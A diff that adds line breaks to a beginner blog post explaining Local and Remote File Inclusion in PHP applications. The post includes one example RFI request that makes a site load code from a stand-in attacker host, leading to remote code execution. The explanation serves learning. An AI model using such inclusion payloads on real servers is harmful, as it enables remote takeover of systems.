@@ -1,6 +1,6 @@
 # <center> RFI and LFI, how to find them and what’s the difference between them? </center>
 
-Hello everyone! Today I'm writing my first blog about two really similiar vulnerabilities.
+Hello everyone! <br> Today I'm writing my first blog about two really similiar vulnerabilities.
 File Inclusions are mostly found in PHP Applications, they are the result of using <code> include() </code> incorrectly 
 (for the most cases). In addition they can be found in Node JS and Python Apps too. People sometimes can't make the difference 
 between those two similiar vulnerabilities, that's okay because in today's blog I'll try to explain it on some easy examples.
@@ -17,7 +17,7 @@ On the other hand while exploiting RFI you can upload file from remote server wh
 RCE(Remote Code Execution). For example <code> https://www.site.com/app.php?file=http://attackers.website.com/file.php </code>.
 You could execute malicious code from the <code> file.php </code> file and use it for evil intention.
 LFI is way more popular than RFI because nowadays it is way easier to protect against including Remote Malicious Files, but
-you never know 🙂. 
+you never know 🙂. <br>
 File Inclusion Vulnerabilities are ranked critical since they can cause server-side injections and in most cases you can get RCE.
 
 # > Some File Inlusion Reports:
